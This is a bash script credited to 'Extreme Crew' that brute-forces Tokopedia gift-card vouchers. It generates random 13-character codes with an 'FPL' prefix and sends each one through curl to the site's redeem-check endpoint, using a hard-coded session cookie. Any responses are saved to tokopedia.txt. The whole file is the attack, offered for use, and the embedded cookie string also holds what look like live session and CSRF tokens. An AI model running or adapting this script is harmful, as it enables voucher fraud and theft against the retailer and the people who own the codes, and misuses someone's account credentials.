#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ5MTAyOHxJbmhJUVVjNFF6azVVR05wWkNzelFsbEdWVFZCY1N0eU1tdDRjbFkxY1UweFVYWjVRM1JVVVVSalpWVTlJZ289fPt90iPCzIZoEo0eLx1sYtRIP4DLuZTtFrfdOdAEgYY1; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; __sonar=5500600881778050287; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiI1ZTYyZTFhOS1kNzIxLTRlYjgtYTY1ZC1mYWM1OTkzM2M5ODQiLCJ0aGVtZSI6ImRlZmF1bHQifQ; l=1; ins-gaSSId=bc2321bf-eb38-e1fe-4a73-dad2f0e3e623_1524494580; insdrSV=4; scs=%7B%22t%22%3A1%7D; _uetsid=_uetec54aead; pulsa-aff=undefined; _ga=GA1.2.740912291.1524490951; _gid=GA1.2.1287833304.1524490951; _dc_gtm_UA-9801603-23=1; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZGY4OGRiNzAtYzE2Ny00MmQ3LWE5ODYtYmNlNmE2MmNiMmVhIiwiaXNfYWpheCI6dHJ1ZX0; _SID_Tokopedia_=WpkbsoM3Jm8d2udnGxgJs3HkfY6AWniogQ6hypBWxNaQ0ikKvDhMuCZPclo6ZTvKAcShd5OOzuXE7FAG5J5w27rTgydnL2QG6VULj77kFZQAx7ReVh-oVizDIQuMWOKP; __asc=458d769b162f2bdd65f576c21b1; __auc=458d769b162f2bdd65f576c21b1; _ga=GA1.3.740912291.1524490951; _gid=GA1.3.1287833304.1524490951; _gat_UA-9801603-23=1; _ampSES=ccab9db754SES01b20d45e603-30798-1524491045379; _ampUITN=b1b17d254bbot127a9a53870c-30798-1524491045383; _ampNV=0; _ampRV=1; _ampCon=Canada; _ampCity=Montreal"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
